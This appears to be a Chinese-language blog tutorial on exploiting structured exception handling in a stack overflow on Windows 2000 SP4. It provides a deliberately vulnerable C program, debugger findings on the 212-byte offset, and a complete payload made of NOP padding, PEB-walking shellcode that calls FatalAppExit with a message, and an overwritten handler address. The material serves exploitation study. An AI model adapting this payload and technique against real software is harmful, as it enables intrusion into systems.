---
layout:		post
title:		在栈溢出中利用S.E.H
author:		wooy0ung
tags:		
category:  	exploit
---


>[分析环境]  
>系统: Windows 2000 Professional sp4  
>编译器: Visual C++ 6.0  
>调试器: OllyDbg 1.10  
<!-- more -->


### 0x00 前期准备

VC 6.0新建一个工程, 贴入以下代码, 选择release版本

```
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

DWORD MyExceptionhandler()
{
	printf("got an exception, press Enter to kill process!\n");
	getchar();
	ExitProcess(1);

	return 0;
}

void test(char *input)
{
	char buf[200];
	int zero=0;
	__asm int 3;
	__try
	{
		strcpy(buf,input);
		zero=4/zero;
	}
	__except(MyExceptionhandler()){};
}

int main()
{
	test(shellcode);

	return 0;
}
```


### 0x01 exploit

运行*.exe, 弹出异常框, 选择取消自动调用OllyDbg附加调试

![](/assets/img/exploit/2017-10-01-windows-2000-stackseh/0x00.png)

单步到rep movsd指令, 执行后观察栈区, 此时正在把shellcode copy到栈上, 起始栈地址0x0012FE98

![](/assets/img/exploit/2017-10-01-windows-2000-stackseh/0x01.png)

View->SEH chain, 定位到最近的S.E.H结构, 栈地址0x0012FF68

![](/assets/img/exploit/2017-10-01-windows-2000-stackseh/0x02.png)

strcpy的起始地址0x0012FE98与S.E.H的异常句柄0x0012FF6C相隔212 byte

![](/assets/img/exploit/2017-10-01-windows-2000-stackseh/0x03.png)

如下组织212 byte的payload, 最后213~216 byte覆盖为shellcode起始地址0x0012FE98

```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90"
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"
"\x98\xfe\x12\x00";
```

pwn~

![](/assets/img/exploit/2017-10-01-windows-2000-stackseh/0x04.png)